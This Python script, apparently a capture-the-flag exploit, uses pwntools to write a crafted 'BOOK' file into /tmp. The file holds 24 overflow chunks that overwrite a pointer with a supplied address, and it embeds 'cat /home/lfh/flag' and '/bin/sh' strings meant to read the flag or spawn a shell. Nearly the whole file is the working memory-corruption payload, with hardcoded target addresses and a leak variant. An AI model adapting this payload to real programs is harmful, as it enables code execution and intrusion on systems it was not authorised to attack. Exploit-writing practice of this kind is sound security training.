#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports
from pwn import *
import sys


target = sys.argv[1]

addrer = int(target, 16)

f = open("/tmp/webfang/BOOK", "wb")

magic = "BOOK"

title = "cat /home/lfh/flag\x00"
title = title.ljust(0x20, "a")
abstract = "b" * 0x100
fptr = "c" * 8
content_len = p32(0x139)
is_unicode = p32(0x59000000)
content_ptr = p64(0)
next_ptr = p64(0)

chunks = []

main = 0x400e72
bss = 0x603050
puts= 0x400feb
start = 0x400ac0
getchar = 0x401015
load_file = 0x400c1e

switch = sys.argv[2]

for i in range(24):

    if switch == "1":
        if i < 23:
            chunk1 = title + abstract + fptr + p32(0x140) + is_unicode + content_ptr + next_ptr
            chunk1 += "x" * 0x140 + "y" * 0x130 + p64(addrer) + "t" * 8 
            chunks.append(chunk1)
        else:
            #shot to leak!
            chunk2 = title + abstract + fptr + p32(0x140) + is_unicode + content_ptr + next_ptr 
            chunk2 += "m" * 0x140 + "n" * 0x130 + "Y" * 15
            chunks.append(chunk2)
    else:
        chunk3 = title + abstract + fptr + p32(0x140) + is_unicode + content_ptr + next_ptr
        chunk3 += "x" * 0x140 + "y" * 0x10 + "/bin/sh\x00" + "y"*0x118 + p64(addrer) + "t" * 8 
        chunks.append(chunk3)
        


strr = ""
for c in chunks:

    strr += c
    

f.write(magic + strr)
f.close()
